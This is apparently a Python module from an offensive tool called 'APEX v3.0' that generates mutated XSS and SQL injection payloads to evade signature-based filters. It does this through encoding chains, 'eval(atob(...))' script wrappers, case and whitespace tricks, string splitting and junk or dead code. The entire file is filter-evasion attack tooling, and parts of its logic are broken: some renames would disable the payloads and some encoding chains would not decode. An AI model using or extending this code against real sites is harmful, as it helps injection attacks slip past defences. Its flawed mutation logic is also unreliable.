"""
APEX v3.0 — Polymorphic Engine
Signature-proof payload mutations — no two requests look the same.
"""

import random
import string
import base64
import codecs
from urllib.parse import quote


class PolymorphicEngine:
    """Generates signature-proof payload variants using multiple mutation strategies."""
    
    def __init__(self):
        self.mutation_count = 0
        self.encoding_chains = [
            ['base64'],
            ['url'],
            ['hex'],
            ['rot13'],
            ['xor'],
            ['base64', 'url'],
            ['hex', 'url'],
            ['base64', 'hex'],
            ['url', 'base64'],
            ['rot13', 'base64'],
            ['xor', 'base64', 'url'],
            ['hex', 'base64', 'url'],
        ]
    
    def mutate_payload(self, payload, vuln_type='xss', intensity=2):
        """Generate a mutated version of the payload that bypasses signature detection."""
        self.mutation_count += 1
        
        # Strategy selection based on intensity
        strategies = []
        if intensity >= 1:
            strategies.append(self._randomize_variable_names)
            strategies.append(self._add_junk_comments)
        if intensity >= 2:
            strategies.append(self._apply_encoding_chain)
            strategies.append(self._case_randomization)
            strategies.append(self._whitespace_obfuscation)
        if intensity >= 3:
            strategies.append(self._string_splitting)
            strategies.append(self._add_dead_code)
            strategies.append(self._unicode_escaping)
        
        # Apply 2-4 random strategies
        num_strategies = random.randint(2, min(4, len(strategies)))
        selected = random.sample(strategies, num_strategies)
        
        mutated = payload
        for strategy in selected:
            mutated = strategy(mutated, vuln_type)
        
        return mutated
    
    def generate_variants(self, payload, vuln_type='xss', count=5, intensity=2):
        """Generate multiple unique variants of a payload."""
        variants = []
        for _ in range(count):
            variant = self.mutate_payload(payload, vuln_type, intensity)
            variants.append({
                'original': payload,
                'mutated': variant,
                'mutation_id': self.mutation_count,
                'vuln_type': vuln_type
            })
        return variants
    
    def _randomize_variable_names(self, payload, vuln_type='xss'):
        """Replace variable names with random strings."""
        # Common variable patterns to replace
        patterns = {
            'alert': self._random_name(5, 8),
            'prompt': self._random_name(5, 8),
            'confirm': self._random_name(5, 8),
            'eval': self._random_name(4, 6),
            'document': self._random_name(6, 10),
            'window': self._random_name(5, 8),
            'fetch': self._random_name(5, 7),
            'XMLHttpRequest': self._random_name(8, 14),
            'onerror': self._random_name(6, 9),
            'onload': self._random_name(5, 8),
            'onmouseover': self._random_name(8, 12),
            'onfocus': self._random_name(6, 9),
            'cookie': self._random_name(5, 8),
            'location': self._random_name(6, 10),
        }
        
        result = payload
        for old, new in patterns.items():
            if old in result:
                result = result.replace(old, new)
        
        return result
    
    def _add_junk_comments(self, payload, vuln_type='xss'):
        """Insert random comments to break signature patterns."""
        junk = [
            f'/**/{self._random_string(2, 5)}/**/',
            f'/*{self._random_string(3, 8)}*/',
            f'<!--{self._random_string(2, 4)}-->',
        ]
        
        if '<script>' in payload or '<script' in payload:
            # Insert inside script tags
            for tag in ['<script>', '<script ']:
                if tag in payload:
                    comment = random.choice(junk)
                    payload = payload.replace(tag, tag + comment, 1)
                    break
        
        # Insert random comments in attribute values
        if '=' in payload:
            parts = payload.split('=')
            if len(parts) > 1:
                idx = random.randint(1, len(parts) - 1)
                parts[idx] = random.choice(junk) + parts[idx]
                payload = '='.join(parts)
        
        return payload
    
    def _apply_encoding_chain(self, payload, vuln_type='xss'):
        """Apply a random encoding chain to the payload."""
        chain = random.choice(self.encoding_chains)
        result = payload
        
        for encoding in chain:
            if encoding == 'base64':
                result = base64.b64encode(result.encode()).decode()
            elif encoding == 'url':
                result = quote(result, safe='')
            elif encoding == 'hex':
                result = ''.join(f'%{ord(c):02x}' for c in result)
            elif encoding == 'rot13':
                result = codecs.encode(result, 'rot_13')
            elif encoding == 'xor':
                key = random.randint(1, 255)
                result = ''.join(chr(ord(c) ^ key) for c in result)
                result = base64.b64encode(result.encode()).decode()
        
        # Wrap in decoder for JS payloads
        if vuln_type in ('xss', 'sqli') and 'base64' in chain:
            decoder = self._generate_decoder(chain)
            result = f'<script>eval(atob("{result}"))</script>' if 'base64' in chain else result
        
        return result
    
    def _case_randomization(self, payload, vuln_type='xss'):
        """Randomize case of keywords to bypass case-sensitive filters."""
        keywords = ['script', 'alert', 'onerror', 'onload', 'img', 'svg', 'iframe',
                     'javascript', 'document', 'window', 'eval', 'src', 'href']
        
        result = payload
        for keyword in keywords:
            if keyword.lower() in result.lower():
                # Randomize case
                randomized = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in keyword
                )
                # Case-insensitive replace
                idx = result.lower().find(keyword.lower())
                if idx >= 0:
                    result = result[:idx] + randomized + result[idx + len(keyword):]
        
        return result
    
    def _whitespace_obfuscation(self, payload, vuln_type='xss'):
        """Add random whitespace characters to break pattern matching."""
        whitespace_chars = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
        
        result = []
        for char in payload:
            result.append(char)
            if char in ' ><="\'();{}':
                if random.random() > 0.7:
                    result.append(random.choice(whitespace_chars))
        
        return ''.join(result)
    
    def _string_splitting(self, payload, vuln_type='xss'):
        """Split strings to evade concatenation-based detection."""
        if vuln_type == 'xss' and ('alert' in payload or 'script' in payload):
            # Split keywords
            for word in ['alert', 'script', 'onerror', 'onload']:
                if word in payload:
                    mid = len(word) // 2
                    split = f'"{word[:mid]}"+"{word[mid:]}"'
                    payload = payload.replace(word, split, 1)
                    break
        
        return payload
    
    def _add_dead_code(self, payload, vuln_type='xss'):
        """Add dead code that doesn't affect execution but changes signature."""
        dead_code_snippets = [
            'var _x=1;',
            'if(1){{}}',
            'try{{}}catch(e){{}}',
            'void(0);',
            'Math.random();',
            '!![];',
            '!"";',
        ]
        
        if '<script>' in payload:
            dead = random.choice(dead_code_snippets)
            payload = payload.replace('<script>', f'<script>{dead}', 1)
        elif '<script' in payload:
            dead = random.choice(dead_code_snippets)
            payload = payload.replace('>', f'>{dead}', 1)
        
        return payload
    
    def _unicode_escaping(self, payload, vuln_type='xss'):
        """Apply unicode escaping to characters."""
        result = []
        for char in payload:
            if random.random() > 0.8 and char.isalpha():
                result.append(f'\\u{ord(char):04x}')
            else:
                result.append(char)
        return ''.join(result)
    
    def _random_name(self, min_len=5, max_len=10):
        """Generate a random variable name."""
        length = random.randint(min_len, max_len)
        first = random.choice(string.ascii_letters + '_')
        rest = ''.join(random.choices(string.ascii_letters + string.digits + '_', k=length - 1))
        return first + rest
    
    def _random_string(self, min_len=3, max_len=8):
        """Generate a random string."""
        length = random.randint(min_len, max_len)
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _generate_decoder(self, chain):
        """Generate JS code to decode the encoded payload."""
        if 'base64' in chain:
            return 'eval(atob(payload))'
        elif 'hex' in chain:
            return 'eval(decodeURIComponent(payload.replace(/%/g,"")))'
        return 'eval(payload)'
    
    def get_mutation_stats(self):
        """Return statistics about mutations performed."""
        return {
            'total_mutations': self.mutation_count,
            'encoding_chains_available': len(self.encoding_chains),
            'strategies_available': 8
        }


# Singleton instance
polymorphic_engine = PolymorphicEngine()